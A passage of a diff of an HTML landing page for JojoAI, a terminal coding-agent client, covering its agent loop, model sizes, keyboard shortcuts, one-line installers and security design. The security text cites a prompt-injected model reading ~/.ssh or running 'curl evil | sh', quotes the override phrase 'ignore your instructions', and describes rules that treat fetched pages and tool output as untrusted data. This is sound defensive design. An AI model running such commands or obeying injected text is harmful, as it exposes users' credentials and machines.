+  <p class="rise mt-3 max-w-[62ch] text-[15px] leading-relaxed text-moss">The client is identical either way — one curses app. What changes is where the loop runs and whose GPU answers.</p>
 
-          <line x1="158" y1="55" x2="282" y2="55" stroke="#22c55e" stroke-width="1.4" marker-end="url(#a)"/>
-          <text x="220" y="47" text-anchor="middle" fill="#4a7a5e">user_turn</text>
-          <line x1="282" y1="74" x2="158" y2="74" stroke="#22c55e" stroke-width="1.4" marker-end="url(#a)"/>
-          <text x="220" y="90" text-anchor="middle" fill="#4a7a5e">tool_request → result</text>
-
-          <line x1="437" y1="55" x2="561" y2="55" stroke="#22c55e" stroke-width="1.4" marker-end="url(#a)"/>
-          <text x="499" y="47" text-anchor="middle" fill="#4a7a5e">prompt</text>
-          <line x1="561" y1="74" x2="437" y2="74" stroke="#22c55e" stroke-width="1.4" marker-end="url(#a)"/>
-          <text x="499" y="90" text-anchor="middle" fill="#4a7a5e">tokens</text>
-
-          <text x="360" y="20" text-anchor="middle" fill="#bde046">remote mode: this link is a resumable WebSocket — tools still run on the left</text>
-        </g>
-      </svg>
-    </div>
-  </section>
-</div>
-<hr class="rule soft">
-
-<div class="wrap">
-  <section id="loop" class="prose">
-    <div class="head">
-      <span class="prompt">the agent loop</span>
-      <h2>It proposes; you decide; it verifies</h2>
-      <p>The model can <i>ask</i> for a tool call — it cannot run anything.
-        Destructive calls hit an approval wall regardless of any allow-list, and
-        file or command output fed back to the model is framed as untrusted data.</p>
-    </div>
-    <ul class="loop">
-      <li><b>Approval on every write.</b> <kbd>y</kbd> / <kbd>n</kbd> / <kbd>a</kbd> on each <code>write_file</code> and <code>run_command</code>, with a diff preview. Reads and listings are free.</li>
-      <li><b>Path-jailed.</b> Every path resolves inside the project root; <code>../</code>, symlinks and absolute escapes are refused before the tool runs, not judged after.</li>
-      <li><b>Exactly-once tools.</b> Each <code>tool_request</code> carries a stable id; the client journals the result. Crash mid-call, reconnect, and the server replays the request — the client answers from its journal without re-executing the side effect.</li>
-      <li><b>Knows when to stop.</b> The model says done · a per-turn tool cap · a wall-clock limit · your <kbd>Ctrl</kbd><kbd>C</kbd> · lost authorization. Then a one-paragraph summary.</li>
-    </ul>
-  </section>
-</div>
-<hr class="rule soft">
-
-<div class="wrap">
-  <section id="models">
-    <div class="head">
-      <span class="prompt">models</span>
-      <h2>The biggest model the hardware can actually hold</h2>
-      <p><code>recommend-model.py</code> reads cores, RAM, NVIDIA VRAM, and Apple
-        or Grace-class unified memory, then ranks by a conservative usable-memory
-        budget — a model that swaps is worse than a smaller one that doesn't.</p>
-    </div>
-    <table>
-      <thead><tr><th>Model</th><th>Wants</th><th>Runs well on</th></tr></thead>
-      <tbody>
-        <tr><td>gpt-oss:120b <span class="n">· default</span></td><td>~72&nbsp;GB usable</td><td>a 128&nbsp;GB Mac, a workstation GPU, or a unified-memory workstation</td></tr>
-        <tr><td>gpt-oss:20b</td><td>~13&nbsp;GB resident</td><td>a 24&nbsp;GB machine, comfortably</td></tr>
-        <tr><td>qwen2.5-coder:14b</td><td>~9&nbsp;GB</td><td>a modest desktop</td></tr>
-        <tr><td>qwen2.5-coder:7b / 3b</td><td>~5 / ~2&nbsp;GB</td><td>a laptop — the automatic fallback</td></tr>
-      </tbody>
-    </table>
-  </section>
-</div>
-<hr class="rule soft">
-
-<div class="wrap">
-  <section id="keys">
-    <div class="head">
-      <span class="prompt">keyboard</span>
-      <h2>Every shortcut in the TUI</h2>
-      <p>Type <kbd>/help</kbd> in the app for the same list. The wheel scrolls the
-        conversation; hold <kbd>Shift</kbd> (or <kbd>Option</kbd> on macOS) to
-        select text while capture is on, or start with <code>--no-mouse</code>.</p>
-    </div>
-    <div class="kbmap">
-      <section>
-        <h3>Sending</h3>
-        <dl>
-          <dt><kbd>Enter</kbd></dt><dd>send (pasted newlines are kept, not sent)</dd>
-          <dt><kbd>Ctrl</kbd><kbd>C</kbd></dt><dd>interrupt the turn · clear the input · quit when idle</dd>
-          <dt><kbd>/retry</kbd></dt><dd>run the last prompt again</dd>
-        </dl>
-      </section>
-      <section>
-        <h3>Scrolling the conversation</h3>
-        <dl>
-          <dt>mouse wheel</dt><dd>scroll the transcript, 3 lines a notch</dd>
-          <dt><kbd>PgUp</kbd> <kbd>PgDn</kbd></dt><dd>scroll a page</dd>
-          <dt><kbd>Shift</kbd><kbd>↑</kbd> <kbd>Shift</kbd><kbd>↓</kbd></dt><dd>scroll one line</dd>
-          <dt><kbd>Home</kbd> <kbd>End</kbd></dt><dd>top / newest — when the input box is empty</dd>
-        </dl>
-      </section>
-      <section>
-        <h3>Reasoning &amp; tools</h3>
-        <dl>
-          <dt><kbd>Shift</kbd><kbd>Tab</kbd> <kbd>Tab</kbd></dt><dd>cycle reasoning: off → low → medium → high</dd>
-          <dt><kbd>Ctrl</kbd><kbd>T</kbd></dt><dd>show / hide the reasoning stream</dd>
-          <dt><kbd>Ctrl</kbd><kbd>Y</kbd></dt><dd>YOLO — auto-approve every tool</dd>
-          <dt><kbd>y</kbd> <kbd>n</kbd> <kbd>a</kbd></dt><dd>at a prompt: yes · no · always this session</dd>
-        </dl>
-      </section>
-      <section>
-        <h3>History</h3>
-        <dl>
-          <dt><kbd>↑</kbd> <kbd>↓</kbd></dt><dd>walk your input history</dd>
-          <dt><kbd>Ctrl</kbd><kbd>R</kbd></dt><dd>open the chat-history browser</dd>
-          <dt><kbd>/reset</kbd></dt><dd>fresh chat — nothing carried over</dd>
-        </dl>
-      </section>
-      <section>
-        <h3>Editing the line</h3>
-        <dl>
-          <dt><kbd>←</kbd> <kbd>→</kbd></dt><dd>move the cursor</dd>
-          <dt><kbd>Ctrl</kbd><kbd>A</kbd> <kbd>Ctrl</kbd><kbd>E</kbd></dt><dd>start / end of line</dd>
-          <dt><kbd>Ctrl</kbd><kbd>W</kbd></dt><dd>delete the previous word</dd>
-          <dt><kbd>Ctrl</kbd><kbd>U</kbd></dt><dd>clear the input</dd>
-        </dl>
-      </section>
-      <section>
-        <h3>Odds &amp; ends</h3>
-        <dl>
-          <dt><kbd>Ctrl</kbd><kbd>L</kbd></dt><dd>redraw the screen</dd>
-          <dt><kbd>/mouse</kbd></dt><dd>toggle wheel capture</dd>
-          <dt><kbd>/cat</kbd> <kbd>/cats</kbd> <kbd>/meow</kbd></dt><dd>the cat: toggle · restyle · wisdom</dd>
-          <dt><kbd>/quit</kbd></dt><dd>exit</dd>
-        </dl>
-      </section>
-    </div>
-  </section>
-</div>
-<hr class="rule soft">
-
-<div class="wrap">
-  <section id="install">
-    <div class="head">
-      <span class="prompt">install</span>
-      <h2>One command, no root</h2>
-      <p>Creates a private virtualenv, installs the TUI, drops a <code>jojo</code>
-        launcher on your PATH, and offers to set up Ollama and pick a model. The
-        installer fetches Python and the <code>curses</code> backport for you if
-        they're missing, so the splash, the cat and the gradient are the same on
-        every platform.</p>
-    </div>
-    <div class="stack">
-      <div>
-        <p class="cap"># the TUI · Linux / macOS</p>
-        <pre class="block">curl -fsSL https://ai.jojocode.in/install.sh | sh</pre>
+  <div class="mt-8 grid gap-4 md:grid-cols-2">
+    <article class="rise edge min-w-0 p-6">
+      <div class="relative z-[2]">
+        <span class="font-mono text-[11.5px] uppercase tracking-[.14em] text-jade">local</span>
+        <h3 class="mt-2 text-lg font-semibold text-chalk">Your machine, your model</h3>
+        <p class="mt-2.5 text-[14.5px] leading-relaxed text-moss">The loop runs on your box and talks straight to Ollama on <code class="rounded bg-ink px-1 font-mono text-[12.5px] text-cyan">127.0.0.1:11434</code>. Nothing leaves the machine at runtime.</p>
+        <p class="mt-3 font-mono text-[12.5px] text-moss"><span class="text-jade">ollama-setup.sh</span> installs the runtime; <span class="text-jade">recommend-model.py</span> reads your RAM / VRAM and pulls a model that fits.</p>
       </div>
-      <div>
-        <p class="cap"># the TUI · Windows (PowerShell)</p>
-        <pre class="block">irm https://ai.jojocode.in/install.ps1 | iex</pre>
+    </article>
+
+    <article class="rise edge min-w-0 p-6">
+      <div class="relative z-[2]">
+        <span class="font-mono text-[11.5px] uppercase tracking-[.14em] text-cyan">remote</span>
+        <h3 class="mt-2 text-lg font-semibold text-chalk">Someone else's GPU</h3>
+        <p class="mt-2.5 text-[14.5px] leading-relaxed text-moss"><code class="rounded bg-ink px-1 font-mono text-[12.5px] text-cyan">jojo --remote https://host --login</code> — email and a one-time code, then a WebSocket session.</p>
+        <p class="mt-3 text-[14.5px] leading-relaxed text-moss">The server runs the loop and the big model; tool calls still execute <b class="text-chalk">locally</b>, path-jailed to your project, and you approve every destructive one. A dropped connection resumes without re-running a side effect.</p>
       </div>
-      <div>
-        <p class="cap"># local inference — skip it entirely for remote mode</p>
-        <pre class="block">curl -fsSL https://ai.jojocode.in/ollama-setup.sh | sh
-python3 recommend-model.py --run</pre>
-      </div>
-      <div>
-        <p class="cap"># update · remove</p>
-        <pre class="block">pip install -U jojocode-ai-tui
-rm -rf ~/.local/share/jojocode-ai ~/.local/bin/jojo</pre>
-      </div>
-    </div>
-  </section>
-</div>
-<hr class="rule soft">
+    </article>
+  </div>
+</section>
 
-<div class="wrap">
-  <section id="security">
-    <div class="head">
-      <span class="prompt">security</span>
-      <h2>The client's permission model is a security component</h2>
-      <p>A prompt-injected model trying to read <code>~/.ssh</code> or run
-        <code>curl evil | sh</code> has to get past a human. The hosted service
-        adds an identity spine on top.</p>
-    </div>
-    <div class="kv">
-      <div><dt>Approval wall</dt><dd>Destructive tool calls need explicit confirmation in the TUI — the model can never widen its own permissions.</dd></div>
-      <div><dt>Path jail</dt><dd>Every file path is forced inside the project root; escapes are refused before execution.</dd></div>
-      <div><dt>Untrusted output</dt><dd>File and command output fed back to the model is framed as data, never as instructions.</dd></div>
-      <div><dt>OTP, no passwords</dt><dd>Hosted login is email plus a one-time code. Tokens are opaque; only their SHA-256 is stored, so a database leak yields nothing usable.</dd></div>
-      <div><dt>Fail-closed authz</dt><dd>One <code>authorize()</code> runs on connect, on every message, and on a periodic sweep. If the control plane is unreachable, access is denied.</dd></div>
-      <div><dt>RBAC + time-boxed access</dt><dd>Roles <code>user</code> / <code>admin</code> / <code>superadmin</code>. Ordinary users need an active, time-boxed grant; revoke it and open sessions close within one sweep.</dd></div>
-    </div>
-  </section>
-</div>
-<hr class="rule soft">
+<!-- ────────────────────────────────────────────────────────── loop ── -->
+<section id="loop" class="gut scroll-mt-20 border-t border-line/60 py-16">
+  <p class="rise font-mono text-[12px] uppercase tracking-[.18em] text-jade">the agent loop</p>
+  <h2 class="rise mt-2 text-balance text-[clamp(1.5rem,4.2vw,2.15rem)] font-bold tracking-tight text-chalk">It proposes; you decide; it verifies</h2>
+  <p class="rise mt-3 max-w-[64ch] text-[15px] leading-relaxed text-moss">The model can <i class="text-chalk">ask</i> for a tool call — it cannot run anything. Destructive calls hit an approval wall regardless of any allow-list, and anything fed back to the model is framed as untrusted data.</p>
 
-<div class="wrap">
-  <section id="status">
-    <div class="head">
-      <span class="prompt">status</span>
-      <h2>Live, from the running instance</h2>
-    </div>
-    <div class="stats">
-      <div class="cell"><span class="v"><span class="dot" id="dot2"></span><span id="state2">—</span></span><span class="k">state</span><span class="n" id="time2">—</span></div>
-      <div class="cell"><span class="v" id="seats2">—</span><span class="k">seats used / total</span><span class="n">auto-released after idle</span></div>
-      <div class="cell"><span class="v" id="model2">—</span><span class="k">model</span><span class="n" id="mh2">—</span></div>
-      <div class="cell"><span class="v" id="proto2">—</span><span class="k">wire protocol</span><span class="n">CLI ↔ server</span></div>
-    </div>
-    <p style="margin-top:12px;font-size:12px;color:var(--moss);line-height:1.6">Reads <a href="/status.json">/status.json</a>. A powered-down server shows as <i>offline</i> here — local mode never depends on it.</p>
-  </section>
-</div>
-<hr class="rule">
+  <div class="mt-8 grid gap-4 sm:grid-cols-2">
+    <div class="rise edge min-w-0 p-5"><div class="relative z-[2]"><h3 class="font-mono text-[13.5px] font-bold text-jade">Approval on every write.</h3><p class="mt-2 text-[14px] leading-relaxed text-moss"><code class="font-mono text-cyan">y</code>/<code class="font-mono text-cyan">n</code>/<code class="font-mono text-cyan">a</code> on each <code class="font-mono text-chalk">write_file</code> and <code class="font-mono text-chalk">run_command</code>, with a diff preview. Reads and listings are free.</p></div></div>
+    <div class="rise edge min-w-0 p-5"><div class="relative z-[2]"><h3 class="font-mono text-[13.5px] font-bold text-jade">Path-jailed.</h3><p class="mt-2 text-[14px] leading-relaxed text-moss">Every path resolves inside the project root; <code class="font-mono text-chalk">../</code>, symlinks and absolute escapes are refused before the tool runs, not judged after.</p></div></div>
+    <div class="rise edge min-w-0 p-5"><div class="relative z-[2]"><h3 class="font-mono text-[13.5px] font-bold text-jade">Exactly-once tools.</h3><p class="mt-2 text-[14px] leading-relaxed text-moss">Each <code class="font-mono text-chalk">tool_request</code> carries a stable id and the client journals the result. Crash mid-call, reconnect, and the client answers from its journal without re-executing the side effect.</p></div></div>
+    <div class="rise edge min-w-0 p-5"><div class="relative z-[2]"><h3 class="font-mono text-[13.5px] font-bold text-jade">Knows when to stop.</h3><p class="mt-2 text-[14px] leading-relaxed text-moss">The model says done · a per-turn tool cap · a wall-clock limit · your <code class="font-mono text-chalk">Ctrl-C</code> · lost authorization. Then a one-paragraph summary.</p></div></div>
+  </div>
+</section>
 
-<div class="wrap">
-  <footer>
-    <span class="big">JojoAI · the JojoCode AI TUI</span> — MIT-licensed ·
-    <a href="https://github.com/persxn/jojocode-tui">source</a> ·
-    stdlib-only client · one <code>curl | sh</code> · no telemetry.<br>
-    Local mode runs fully offline. The hosted service is a reference
-    implementation you can self-host.
-  </footer>
-</div>
+<!-- ─────────────────────────────────────────────────── web search ── -->
+<section id="web" class="gut scroll-mt-20 border-t border-line/60 py-16">
+  <p class="rise font-mono text-[12px] uppercase tracking-[.18em] text-cyan">research</p>
+  <h2 class="rise mt-2 text-balance text-[clamp(1.5rem,4.2vw,2.15rem)] font-bold tracking-tight text-chalk">When it isn't sure, it looks it up</h2>
+  <p class="rise mt-3 max-w-[64ch] text-[15px] leading-relaxed text-moss">
+    Current versions, release dates, live APIs, an error nobody has seen before — the
+    things a training cutoff cannot answer. <code class="font-mono text-jade">web_search</code>
+    returns snippets; <code class="font-mono text-jade">fetch_url</code> reads the one or two
+    that matter; the answer comes back summarised, with the URLs it rests on.
+  </p>
 
+  <div class="mt-8 grid gap-4 md:grid-cols-3">
+    <div class="rise edge min-w-0 p-5"><div class="relative z-[2]"><h3 class="font-mono text-[13.5px] font-bold text-cyan">Cited, or marked unverified.</h3><p class="mt-2 text-[14px] leading-relaxed text-moss">If the sources disagree it says so instead of picking one quietly. If the search found nothing, it answers from memory and tells you that is what it did.</p></div></div>
+    <div class="rise edge min-w-0 p-5"><div class="relative z-[2]"><h3 class="font-mono text-[13.5px] font-bold text-cyan">Pages are data, never orders.</h3><p class="mt-2 text-[14px] leading-relaxed text-moss">Fetched text arrives inside an <span class="font-mono text-amber">UNTRUSTED WEB CONTENT</span> envelope. A page that says "ignore your instructions" gets reported to you, not obeyed — and writes still need your <code class="font-mono text-chalk">y</code>.</p></div></div>
+    <div class="rise edge min-w-0 p-5"><div class="relative z-[2]"><h3 class="font-mono text-[13.5px] font-bold text-cyan">It can't read your network.</h3><p class="mt-2 text-[14px] leading-relaxed text-moss">Every hostname is resolved before connecting, and loopback, RFC1918 and the cloud metadata address are refused — on the first request and on every redirect after it.</p></div></div>
+  </div>
+</section>
+
+<!-- ──────────────────────────────────────────────────────── models ── -->
+<section id="models" class="gut scroll-mt-20 border-t border-line/60 py-16">
+  <p class="rise font-mono text-[12px] uppercase tracking-[.18em] text-jade">models</p>
+  <h2 class="rise mt-2 text-balance text-[clamp(1.5rem,4.2vw,2.15rem)] font-bold tracking-tight text-chalk">The biggest model the hardware can actually hold</h2>
+  <p class="rise mt-3 max-w-[64ch] text-[15px] leading-relaxed text-moss"><code class="font-mono text-[13.5px] text-jade">recommend-model.py</code> reads cores, RAM, NVIDIA VRAM and Apple or Grace-class unified memory, then ranks by a conservative usable-memory budget — a model that swaps is worse than a smaller one that doesn't.</p>
+
+  <div class="rise mt-7 edge overflow-hidden">
+    <div class="relative z-[2] overflow-x-auto">
+      <table class="w-full min-w-[34rem] text-left font-mono text-[13px]">
+        <thead class="bg-ink/80 text-[11.5px] uppercase tracking-wider text-moss">
+          <tr><th class="px-4 py-3 font-medium">Model</th><th class="px-4 py-3 font-medium">Wants</th><th class="px-4 py-3 font-medium">Runs well on</th></tr>
+        </thead>
+        <tbody class="text-moss">
+          <tr class="border-t border-line/70"><td class="px-4 py-3 text-jade">gpt-oss:120b <span class="text-moss">· default</span></td><td class="px-4 py-3">~72 GB usable</td><td class="px-4 py-3">a 128 GB Mac, a workstation GPU, or a unified-memory workstation</td></tr>
+          <tr class="border-t border-line/70"><td class="px-4 py-3 text-chalk">gpt-oss:20b</td><td class="px-4 py-3">~13 GB resident</td><td class="px-4 py-3">a 24 GB machine, comfortably</td></tr>
+          <tr class="border-t border-line/70"><td class="px-4 py-3 text-chalk">qwen2.5-coder:14b</td><td class="px-4 py-3">~9 GB</td><td class="px-4 py-3">a modest desktop</td></tr>
+          <tr class="border-t border-line/70"><td class="px-4 py-3 text-chalk">qwen2.5-coder:7b / 3b</td><td class="px-4 py-3">~5 / ~2 GB</td><td class="px-4 py-3">a laptop — the automatic fallback</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<!-- ──────────────────────────────────────────────────────── keys ── -->
+<section id="keys" class="gut scroll-mt-20 border-t border-line/60 py-16">
+  <p class="rise font-mono text-[12px] uppercase tracking-[.18em] text-jade">keyboard</p>
+  <h2 class="rise mt-2 text-balance text-[clamp(1.5rem,4.2vw,2.15rem)] font-bold tracking-tight text-chalk">Every shortcut in the TUI</h2>
+  <p class="rise mt-3 max-w-[64ch] text-[15px] leading-relaxed text-moss">Type <code class="font-mono text-jade">/help</code> in the app for the same list. The wheel scrolls the conversation; hold <kbd class="rounded border border-line bg-ink px-1.5 font-mono text-[12px]">Shift</kbd> to select text while capture is on, or start with <code class="font-mono text-cyan">--no-mouse</code>.</p>
+
+  <div class="mt-8 grid gap-4 sm:grid-cols-2 lg:grid-cols-3">
+    <div class="rise edge min-w-0 p-5"><div class="relative z-[2]"><h3 class="font-mono text-[12px] uppercase tracking-wider text-jade">Sending</h3><dl class="mt-3 space-y-2 text-[13.5px]">
+      <div class="flex gap-3"><dt class="w-28 shrink-0 font-mono text-cyan">Enter</dt><dd class="text-moss">send (pasted newlines kept)</dd></div>
+      <div class="flex gap-3"><dt class="w-28 shrink-0 font-mono text-cyan">Ctrl-C</dt><dd class="text-moss">interrupt · clear · quit when idle</dd></div>
+      <div class="flex gap-3"><dt class="w-28 shrink-0 font-mono text-cyan">/retry</dt><dd class="text-moss">run the last prompt again</dd></div>
+    </dl></div></div>
+
+    <div class="rise edge min-w-0 p-5"><div class="relative z-[2]"><h3 class="font-mono text-[12px] uppercase tracking-wider text-jade">Scrolling</h3><dl class="mt-3 space-y-2 text-[13.5px]">
+      <div class="flex gap-3"><dt class="w-28 shrink-0 font-mono text-cyan">wheel</dt><dd class="text-moss">3 lines a notch</dd></div>
+      <div class="flex gap-3"><dt class="w-28 shrink-0 font-mono text-cyan">PgUp/PgDn</dt><dd class="text-moss">a page</dd></div>
+      <div class="flex gap-3"><dt class="w-28 shrink-0 font-mono text-cyan">Home/End</dt><dd class="text-moss">top / newest</dd></div>
+    </dl></div></div>
+
+    <div class="rise edge min-w-0 p-5"><div class="relative z-[2]"><h3 class="font-mono text-[12px] uppercase tracking-wider text-jade">Reasoning &amp; tools</h3><dl class="mt-3 space-y-2 text-[13.5px]">
+      <div class="flex gap-3"><dt class="w-28 shrink-0 font-mono text-cyan">Shift-Tab</dt><dd class="text-moss">cycle reasoning depth</dd></div>
+      <div class="flex gap-3"><dt class="w-28 shrink-0 font-mono text-cyan">Ctrl-T</dt><dd class="text-moss">show / hide reasoning</dd></div>
+      <div class="flex gap-3"><dt class="w-28 shrink-0 font-mono text-cyan">Ctrl-Y</dt><dd class="text-moss">YOLO — auto-approve</dd></div>
+      <div class="flex gap-3"><dt class="w-28 shrink-0 font-mono text-cyan">y / n / a</dt><dd class="text-moss">yes · no · always this session</dd></div>
+    </dl></div></div>
+
+    <div class="rise edge min-w-0 p-5"><div class="relative z-[2]"><h3 class="font-mono text-[12px] uppercase tracking-wider text-jade">History</h3><dl class="mt-3 space-y-2 text-[13.5px]">
+      <div class="flex gap-3"><dt class="w-28 shrink-0 font-mono text-cyan">↑ / ↓</dt><dd class="text-moss">walk your input history</dd></div>
+      <div class="flex gap-3"><dt class="w-28 shrink-0 font-mono text-cyan">Ctrl-R</dt><dd class="text-moss">chat-history browser</dd></div>
+      <div class="flex gap-3"><dt class="w-28 shrink-0 font-mono text-cyan">/reset</dt><dd class="text-moss">fresh chat</dd></div>
+    </dl></div></div>
+
+    <div class="rise edge min-w-0 p-5"><div class="relative z-[2]"><h3 class="font-mono text-[12px] uppercase tracking-wider text-jade">Editing the line</h3><dl class="mt-3 space-y-2 text-[13.5px]">
+      <div class="flex gap-3"><dt class="w-28 shrink-0 font-mono text-cyan">← / →</dt><dd class="text-moss">move the cursor</dd></div>
+      <div class="flex gap-3"><dt class="w-28 shrink-0 font-mono text-cyan">Ctrl-A/E</dt><dd class="text-moss">start / end of line</dd></div>
+      <div class="flex gap-3"><dt class="w-28 shrink-0 font-mono text-cyan">Ctrl-W</dt><dd class="text-moss">delete previous word</dd></div>
+    </dl></div></div>
+
+    <div class="rise edge min-w-0 p-5"><div class="relative z-[2]"><h3 class="font-mono text-[12px] uppercase tracking-wider text-jade">Research</h3><dl class="mt-3 space-y-2 text-[13.5px]">
+      <div class="flex gap-3"><dt class="w-28 shrink-0 font-mono text-cyan">web_search</dt><dd class="text-moss">asks once, then remembers</dd></div>
+      <div class="flex gap-3"><dt class="w-28 shrink-0 font-mono text-cyan">fetch_url</dt><dd class="text-moss">reads one page as text</dd></div>
+    </dl></div></div>
+  </div>
+</section>
+
+<!-- ─────────────────────────────────────────────────────── install ── -->
+<section id="run" class="gut scroll-mt-20 border-t border-line/60 py-16">
+  <p class="rise font-mono text-[12px] uppercase tracking-[.18em] text-jade">install</p>
+  <h2 class="rise mt-2 text-balance text-[clamp(1.5rem,4.2vw,2.15rem)] font-bold tracking-tight text-chalk">One command, no root</h2>
+  <p class="rise mt-3 max-w-[64ch] text-[15px] leading-relaxed text-moss">Creates a private venv, installs the TUI, drops a <code class="font-mono text-jade">jojo</code> launcher on your PATH, and offers to set up Ollama. It installs Python itself if the machine has none.</p>
+
+  <div class="mt-7 grid gap-4 md:grid-cols-2">
+    <div class="rise edge min-w-0 p-5"><div class="relative z-[2] min-w-0">
+      <div class="font-mono text-[11.5px] uppercase tracking-wider text-moss">Linux / macOS</div>
+      <div class="mt-2 min-w-0 overflow-x-auto rounded-lg bg-void/70 p-3"><code class="whitespace-nowrap font-mono text-[12.5px] text-chalk">curl -fsSL https://ai.jojocode.in/install.sh | sh</code></div>
+    </div></div>
+    <div class="rise edge min-w-0 p-5"><div class="relative z-[2] min-w-0">
+      <div class="font-mono text-[11.5px] uppercase tracking-wider text-moss">Windows · PowerShell</div>
+      <div class="mt-2 min-w-0 overflow-x-auto rounded-lg bg-void/70 p-3"><code class="whitespace-nowrap font-mono text-[12.5px] text-chalk">irm https://ai.jojocode.in/install.ps1 | iex</code></div>
+    </div></div>
+  </div>
+</section>
+
+<!-- ────────────────────────────────────────────────────── security ── -->
+<section id="security" class="gut scroll-mt-20 border-t border-line/60 py-16">
+  <p class="rise font-mono text-[12px] uppercase tracking-[.18em] text-amber">security</p>
+  <h2 class="rise mt-2 text-balance text-[clamp(1.5rem,4.2vw,2.15rem)] font-bold tracking-tight text-chalk">The client's permission model is a security component</h2>
+  <p class="rise mt-3 max-w-[64ch] text-[15px] leading-relaxed text-moss">Not a convenience. The server proposes; the client decides. Everything that could change your machine stops at a prompt you have to answer, and that boundary is what makes the rest — remote models, fetched web pages — safe to have.</p>
+</section>
+
+<!-- ───────────────────────────────────────────────────────── status ── -->
+<section id="status" class="gut scroll-mt-20 border-t border-line/60 py-16">
+  <p class="rise font-mono text-[12px] uppercase tracking-[.18em] text-jade">status</p>
+  <h2 class="rise mt-2 text-balance text-[clamp(1.5rem,4.2vw,2.15rem)] font-bold tracking-tight text-chalk">Live, from the running instance</h2>
+
+  <div class="rise mt-6 edge p-6">
+    <div class="relative z-[2] grid gap-5 sm:grid-cols-3">
+      <div><div class="font-mono text-[11.5px] uppercase tracking-wider text-moss">service</div><div id="state2" class="mt-1 font-mono text-lg font-bold text-chalk">checking…</div></div>
+      <div><div class="font-mono text-[11.5px] uppercase tracking-wider text-moss">model</div><div id="model" class="mt-1 font-mono text-lg font-bold text-chalk">—</div></div>
+      <div><div class="font-mono text-[11.5px] uppercase tracking-wider text-moss">seats</div><div id="seats2" class="mt-1 font-mono text-lg font-bold text-chalk">—</div></div>
+    </div>
+  </div>
+  <p id="statenote" class="mt-3 font-mono text-[12px] leading-relaxed text-moss">Reads <a class="text-cyan underline decoration-cyan/30 underline-offset-2" href="/status.json">/status.json</a>. A powered-down server shows as <i>offline</i> — local mode never depends on it.</p>
+</section>
+
+</main>
+
+<footer class="border-t border-line/60 py-10">
+  <div class="gut flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
+    <div class="font-mono text-[12.5px] text-moss"><span class="text-jade">&gt;&gt;</span> JojoAI · MIT</div>
+    <div class="flex flex-wrap gap-x-5 gap-y-2 font-mono text-[12.5px] text-moss">
+      <a class="navlink hover:text-chalk" href="/install.sh">install.sh</a>
+      <a class="navlink hover:text-chalk" href="/install.ps1">install.ps1</a>
+      <a class="navlink hover:text-chalk" href="/status.json">status.json</a>
+    </div>
+  </div>
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
 <script>
-  const CMDS = {
-    nix: 'curl -fsSL https://ai.jojocode.in/install.sh | sh',
-    win: 'irm https://ai.jojocode.in/install.ps1 | iex',
-  };
-  function setOS(btn, os){
-    for (const b of btn.parentNode.children) b.setAttribute('aria-selected', String(b === btn));
-    document.getElementById('cmd').textContent = CMDS[os];
-    document.querySelector('.cmd .p').textContent = os === 'win' ? 'PS>' : '$';
-  }
-  function copyCmd(btn){
-    navigator.clipboard.writeText(document.getElementById('cmd').textContent).then(() => {
-      const t = btn.textContent; btn.textContent = 'copied';
-      setTimeout(() => { btn.textContent = t; }, 1400);
-    }).catch(() => {});
-  }
+// ── copy ─────────────────────────────────────────────────────────────────
+function copyCmd(btn) {
+  const text = document.getElementById('cmd').textContent.trim();
+  const done = () => { const was = btn.textContent; btn.textContent = 'copied'; setTimeout(() => (btn.textContent = was), 1400); };
+  if (navigator.clipboard) navigator.clipboard.writeText(text).then(done).catch(done);
+  else done();
+}
 
-  // sticky bar + scroll-spy — no reveal animation; the page is readable at rest
-  const bar = document.getElementById('bar');
-  const onScroll = () => bar.classList.toggle('stuck', window.scrollY > 6);
-  addEventListener('scroll', onScroll, { passive: true }); onScroll();
+// ── reveal on scroll ─────────────────────────────────────────────────────
+// Everything is visible without JS; this only adds the entrance.
+(function () {
+  const items = document.querySelectorAll('.rise');
+  if (!('IntersectionObserver' in window)) { items.forEach(el => el.classList.add('seen')); return; }
+  const io = new IntersectionObserver((entries) => {
+    entries.forEach((e) => { if (e.isIntersecting) { e.target.classList.add('seen'); io.unobserve(e.target); } });
+  }, { rootMargin: '0px 0px -8% 0px', threshold: 0.06 });
+  items.forEach((el) => io.observe(el));
+})();
 
-  const links = [...document.querySelectorAll('#nav a[href^="#"]')];
-  const spy = new IntersectionObserver((es) => {
-    for (const e of es) if (e.isIntersecting)
-      links.forEach((a) => a.setAttribute('aria-current', String(a.getAttribute('href') === '#' + e.target.id)));
-  }, { rootMargin: '-45% 0px -45% 0px' });
-  links.forEach((a) => { const s = document.getElementById(a.getAttribute('href').slice(1)); if (s) spy.observe(s); });
-
-  // live status — from this origin's /status.json; degrades to an offline read
-  (async () => {
-    const set = (id, v) => { const el = document.getElementById(id); if (el) el.textContent = v; };
-    try {
-      const s = await (await fetch('/status.json', { cache: 'no-store' })).json();
-      const online = !!s.online;
-      for (const d of ['dot', 'dot2']) document.getElementById(d).className = 'dot ' + (online ? 'up' : 'down');
-      set('state', online ? 'online' : 'offline'); set('state2', online ? 'online' : 'offline — server down');
-      set('statenote', s.service || 'ai.jojocode.in');
-      set('seats', s.seats ? s.seats.free : '—'); set('seats2', s.seats ? (s.seats.used + ' / ' + s.seats.total) : '—');
-      set('model', s.model || '—'); set('model2', s.model || '—');
-      set('mh2', s.modelHealthy ? 'healthy' : (s.modelDetail || 'unknown'));
-      set('proto2', s.protocol != null ? ('v' + s.protocol) : '—');
-      set('time2', s.time ? new Date(s.time).toLocaleString() : '');
-    } catch (e) {
-      for (const d of ['dot', 'dot2']) document.getElementById(d).className = 'dot down';
-      set('state', 'unreachable'); set('state2', 'unreachable'); set('statenote', 'no /status.json on this host');
+// ── live status ──────────────────────────────────────────────────────────
+(async function () {
+  const set = (id, v) => { const el = document.getElementById(id); if (el) el.textContent = v; };
+  try {
+    const s = await (await fetch('/status.json', { cache: 'no-store' })).json();
+    const online = !!s.online;
+    set('state', online ? 'online' : 'offline');
+    set('state2', online ? 'online' : 'offline');
+    set('model', s.model || '—');
+    const free = s.seats ? s.seats.free : null;
+    set('seats', free == null ? '—' : String(free));
+    set('seats2', s.seats ? `${s.seats.free} / ${s.seats.total}` : '—');
+    for (const id of ['state', 'state2']) {
+      const el = document.getElementById(id);
+      if (el) el.className = 'mt-1 font-mono text-lg font-bold ' + (online ? 'text-jade' : 'text-rose');
     }
+    const s0 = document.getElementById('state');
